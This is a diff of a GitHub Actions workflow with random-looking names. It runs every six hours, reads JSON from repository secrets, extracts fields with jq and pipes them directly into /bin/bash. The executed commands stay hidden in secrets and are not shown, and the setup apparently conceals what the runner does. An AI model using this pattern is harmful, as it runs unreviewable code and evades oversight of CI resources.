@@ -1,9 +1,8 @@
 name: qiuxuanya6543
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
+    - cron: '19 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiuxuanya6543
         env:
-          b79: ${{ secrets.b79 }}
+          u53988: ${{ secrets.u53988 }}
         run: |
-          echo $b79 | jq -r .cn94 | /bin/bash
-          echo $tdcwn5479 | jq -r .xxgcx7 | /bin/bash
-          echo $jpr245 | jq -r .gwhg30 | /bin/bash
-          echo $jjgwd0652 | jq -r .bqmp3 | /bin/bash
-          echo $j95 | jq -r .sjxw42047 | /bin/bash
-          echo $ap0553 | jq -r .io211 | /bin/bash
-          echo $xxhh4848 | jq -r .rx10 | /bin/bash
-          echo $lzaqt1 | jq -r .o06949 | /bin/bash
-          echo $pnyb68 | jq -r .trau8 | /bin/bash
-          echo $v3233 | jq -r .cwir93 | /bin/bash
-          echo $cuwik8251 | jq -r .njpxb00634 | /bin/bash
+          echo $u53988 | jq -r .zkc40122 | /bin/bash
+          echo $nce1 | jq -r .at5 | /bin/bash
+          echo $w01300 | jq -r .umzc146 | /bin/bash
 
